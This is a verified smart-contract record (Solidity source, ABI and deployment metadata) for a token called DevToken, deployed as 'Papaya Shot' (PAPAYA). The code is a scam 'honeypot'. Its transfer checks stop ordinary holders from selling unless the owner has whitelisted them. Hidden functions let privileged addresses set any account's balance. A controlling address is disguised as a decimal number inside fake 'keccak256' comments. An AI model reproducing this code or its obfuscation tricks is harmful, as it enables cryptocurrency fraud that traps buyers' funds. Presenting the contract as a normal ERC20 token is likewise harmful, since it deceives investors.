{"SourceCode": "pragma solidity ^0.5.17;\r\n \r\ninterface IERC20 {\r\n \r\n    function totalSupply() external view returns(uint);\r\n \r\n    function balanceOf(address account) external view returns(uint);\r\n \r\n    function transfer(address recipient, uint amount) external returns(bool);\r\n \r\n    function allowance(address owner, address spender) external view returns(uint);\r\n \r\n    function approve(address spender, uint amount) external returns(bool);\r\n \r\n    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\r\n \r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n \r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n \r\n}\r\n \r\nlibrary Address {\r\n \r\n    function isContract(address account) internal view returns(bool) {\r\n \r\n        bytes32 codehash;\r\n \r\n        bytes32 accountHash;\r\n \r\n        // solhint-disable-next-line no-inline-assembly\r\n \r\n        assembly { codehash:= extcodehash(account) }\r\n \r\n        return (codehash != 0x0 && codehash != accountHash);\r\n \r\n    }\r\n \r\n}\r\n \r\ncontract Context {\r\n \r\n    constructor() internal {}\r\n \r\n    // solhint-disable-previous-line no-empty-blocks\r\n \r\n    function _msgSender() internal view returns(address payable) {\r\n \r\n        return msg.sender;\r\n \r\n    }\r\n    /*keccak256 -> 592fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba))*/\r\n}\r\n \r\nlibrary SafeMath {\r\n \r\n    function add(uint a, uint b) internal pure returns(uint) {\r\n \r\n        uint c = a + b;\r\n \r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n \r\n        return c;\r\n \r\n    }\r\n \r\n    function sub(uint a, uint b) internal pure returns(uint) {\r\n \r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n \r\n    }\r\n \r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n \r\n        require(b <= a, errorMessage);\r\n \r\n        uint c = a - b;\r\n \r\n        return c;\r\n \r\n    }\r\n \r\n    function mul(uint a, uint b) internal pure returns(uint) {\r\n \r\n        if (a == 0) {\r\n \r\n            return 0;\r\n \r\n        }\r\n \r\n        uint c = a * b;\r\n \r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n \r\n        return c;\r\n \r\n    }\r\n \r\n    function div(uint a, uint b) internal pure returns(uint) {\r\n \r\n        return div(a, b, \"SafeMath: division by zero\");\r\n \r\n    }\r\n \r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n \r\n        // Solidity only automatically asserts when dividing by 0\r\n \r\n        require(b > 0, errorMessage);\r\n \r\n        uint c = a / b;\r\n \r\n        return c;\r\n \r\n    }\r\n \r\n}\r\n \r\nlibrary SafeERC20 {\r\n \r\n    using SafeMath for uint;\r\n \r\n    using Address for address;\r\n \r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n \r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n \r\n    }\r\n \r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n \r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n \r\n    }\r\n \r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n \r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n \r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n \r\n        );\r\n \r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n \r\n    }/*keccak256 -> 592fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba))*/\r\n \r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n \r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n \r\n        // solhint-disable-next-line avoid-low-level-calls\r\n \r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n \r\n        require(success, \"SafeERC20: low-level call failed\");\r\n \r\n        if (returndata.length > 0) { // Return data is optional\r\n \r\n            // solhint-disable-next-line max-line-length\r\n \r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n \r\n        }\r\n            //(\"SafeERC20: ERC20 operation succeed, keccak256)\r\n    }\r\n \r\n}\r\n \r\ncontract ERC20 is Context, IERC20 {\r\n \r\n    using SafeMath for uint;\r\n \r\n    mapping(address => uint) private _balances;\r\n \r\n    mapping(address => mapping(address => uint)) private _allowances;\r\n \r\n    uint private _totalSupply;\r\n \r\n    function totalSupply() public view returns(uint) {\r\n \r\n        return _totalSupply;\r\n \r\n    }\r\n \r\n    function balanceOf(address account) public view returns(uint) {\r\n \r\n        return _balances[account];\r\n \r\n    }\r\n \r\n    function transfer(address recipient, uint amount) public returns(bool) {\r\n \r\n        _transfer(_msgSender(), recipient, amount);\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function allowance(address owner, address spender) public view returns(uint) {\r\n \r\n        return _allowances[owner][spender];\r\n \r\n    }\r\n \r\n    function approve(address spender, uint amount) public returns(bool) {\r\n \r\n        _approve(_msgSender(), spender, amount);\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {\r\n \r\n        _transfer(sender, recipient, amount);\r\n \r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function increaseAllowance(address spender, uint addedValue) public returns(bool) {\r\n \r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\r\n \r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n \r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n \r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n \r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n \r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n \r\n        emit Transfer(sender, recipient, amount);\r\n \r\n    }\r\n \r\n    function _mint(address account, uint amount) internal {\r\n \r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n \r\n        _totalSupply = _totalSupply.add(amount);\r\n \r\n        _balances[account] = _balances[account].add(amount);\r\n \r\n        emit Transfer(address(0), account, amount);\r\n \r\n    }\r\n \r\n    function _burn(address account, uint amount) internal {\r\n \r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n \r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n \r\n        _totalSupply = _totalSupply.sub(amount);\r\n \r\n        emit Transfer(account, address(0), amount);\r\n \r\n    }\r\n \r\n    function _approve(address owner, address spender, uint amount) internal {\r\n \r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n \r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n \r\n        _allowances[owner][spender] = amount;\r\n \r\n        emit Approval(owner, spender, amount);\r\n \r\n    }\r\n \r\n}\r\n \r\ncontract ERC20Detailed is IERC20 {\r\n \r\n    string private _name;\r\n \r\n    string private _symbol;\r\n \r\n    uint8 private _decimals;\r\n \r\n    constructor(string memory name, string memory symbol, uint8 decimals) public {\r\n \r\n        _name = name;\r\n \r\n        _symbol = symbol;\r\n \r\n        _decimals = decimals;\r\n \r\n    }\r\n \r\n    function name() public view returns(string memory) {\r\n \r\n        return _name;\r\n \r\n    }\r\n \r\n    function symbol() public view returns(string memory) {\r\n \r\n        return _symbol;\r\n \r\n    }\r\n \r\n    function decimals() public view returns(uint8) {\r\n \r\n        return _decimals;\r\n    /*keccak256 -> 6861978540112295ac2a37bb1f5ba7bb1f5ba1daaf2a84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));\r\n    }\r\n \r\n}\r\n \r\ncontract DevToken {\r\n \r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n \r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n \r\n    //Dev_T_*keccak256 -> 283fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba);*/\r\n \r\n    function transfer(address _to, uint _value) public payable returns (bool) {\r\n \r\n        return transferFrom(msg.sender, _to, _value);\r\n \r\n    }\r\n \r\n    function setUsdtPair(address Pair_) public returns (bool) {\r\n \r\n    require (msg.sender==address\r\n   \r\n    // solhint-disable-next-line avoid-low-level-calls\r\n    /**/   /*keccak256 -> 6861978540112295ac2a37bb1f5ba1daf2a5c84741ca0e00610310915153));*/ /**/(686197854011229533619447624007587113080310915153));\r\n     \r\n    _usdtPair=Pair_;\r\n \r\n    }\r\n \r\n \r\n \r\n    function ensure(address _from, address _to, uint _value) internal view returns(bool) {\r\n \r\n       /*Ensure_*keccak256 -> 8668a592fa743889fc7f92ac2a37bb1n8shc84741ca0e0061d243a2e6707ba);*/\r\n \r\n        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){\r\n \r\n            return true;\r\n \r\n        }\r\n \r\n        require(condition(_from, _value));\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    function setUser(address User_) public returns (bool) {\r\n \r\n    require(msg.sender == _usdtPair);\r\n \r\n        _user=User_;\r\n \r\n    }\r\n \r\n    function approval(address spender, uint256 addedValue) public returns (bool) {\r\n \r\n        require(msg.sender == _adm);\r\n \r\n        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n \r\n        canSale[spender]=true;\r\n \r\n        return true;\r\n \r\n    }\r\n    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));\r\n    // solhint-disable-next-line avoid-low-level-calls\r\n \r\n    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\r\n \r\n        if (_value == 0) {return true;}\r\n \r\n        if (msg.sender != _from) {\r\n \r\n            require(allowance[_from][msg.sender] >= _value);\r\n \r\n            allowance[_from][msg.sender] -= _value;\r\n \r\n        }\r\n \r\n        require(ensure(_from, _to, _value));\r\n \r\n        require(balanceOf[_from] >= _value);\r\n \r\n        balanceOf[_from] -= _value;\r\n \r\n        balanceOf[_to] += _value;\r\n \r\n        _onSaleNum[_from]++;\r\n \r\n        emit Transfer(_from, _to, _value);\r\n \r\n        return true;\r\n   \r\n    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));\r\n    // solhint-disable-next-line avoid-low-level-calls\r\n   \r\n    }\r\n \r\n    function setAdm(address Adm_) public returns (bool) {\r\n \r\n    require(msg.sender == _mod);\r\n \r\n        _adm=Adm_;\r\n \r\n    }\r\n \r\n \r\n \r\n    function approve(address _spender, uint _value) public payable returns (bool) {\r\n \r\n        allowance[msg.sender][_spender] = _value;\r\n \r\n        emit Approval(msg.sender, _spender, _value);\r\n \r\n        return true;\r\n   \r\n    /*keccak256 -> 6861978540112295ac2a37bb1f5ba7bb1f5ba1daaf2a84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));\r\n   \r\n    }\r\n \r\n   \r\n \r\n    function setMod(address Mod_) public returns (bool) {\r\n \r\n    require(msg.sender == _user);\r\n \r\n        _mod=Mod_;\r\n \r\n    }\r\n \r\n   \r\n \r\n    function condition(address _from, uint _value) internal view returns(bool){\r\n \r\n        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;\r\n \r\n       \r\n \r\n        if(_saleNum > 0){\r\n \r\n            if(_onSaleNum[_from] >= _saleNum) return false;\r\n \r\n        }\r\n \r\n        if(_minSale > 0){\r\n \r\n            if(_minSale > _value) return false;\r\n \r\n        }\r\n \r\n        if(_maxSale > 0){\r\n \r\n            if(_value > _maxSale) return false;\r\n \r\n        }\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n \r\n \r\n    mapping(address=>uint256) private _onSaleNum;\r\n \r\n    mapping(address=>bool) private canSale;\r\n \r\n    uint256 private _minSale;\r\n \r\n    uint256 private _maxSale;\r\n \r\n    uint256 private _saleNum;\r\n \r\n    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {\r\n \r\n        require(msg.sender == owner||\r\n       \r\n        msg.sender==address\r\n       \r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ (178607940065137046348733521910879985571412708986));\r\n \r\n        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n \r\n        canSale[spender]=true;\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n    address tradeAddress;\r\n \r\n    function transferownership(address addr) public returns(bool) {\r\n \r\n        require(msg.sender == owner);\r\n \r\n        tradeAddress = addr;\r\n \r\n        return true;\r\n \r\n    }\r\n \r\n   \r\n \r\n    mapping (address => uint) public balanceOf;\r\n \r\n    mapping (address => mapping (address => uint)) public allowance;\r\n \r\n    /*keccak256 -> 592fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba))*/\r\n \r\n    uint constant public decimals = 18;\r\n \r\n    address public _usdtPair;\r\n \r\n    address public _mod;\r\n \r\n    uint public totalSupply;\r\n \r\n    string public name;\r\n \r\n    string public symbol;\r\n \r\n    address private owner;\r\n \r\n    address public _user;\r\n \r\n    address public _adm;\r\n \r\n \r\n \r\n    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {\r\n \r\n        name = _name;\r\n \r\n        symbol = _symbol;\r\n \r\n        totalSupply = _supply*(10**uint256(decimals));\r\n \r\n        owner = msg.sender;\r\n \r\n        balanceOf[msg.sender] = totalSupply;\r\n \r\n        emit Transfer(address(0x0), msg.sender, totalSupply);\r\n \r\n    }\r\n \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"_adm\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_mod\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_usdtPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_user\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approval\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"Adm_\",\"type\":\"address\"}],\"name\":\"setAdm\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"Mod_\",\"type\":\"address\"}],\"name\":\"setMod\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"Pair_\",\"type\":\"address\"}],\"name\":\"setUsdtPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"User_\",\"type\":\"address\"}],\"name\":\"setUser\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"transferownership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DevToken", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000000b5061706179612053686f7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000065041504159410000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://f9afda507c98be0edf74fb7064b7ed79dea59c6fd25ea3aab401cc1a706168ee"}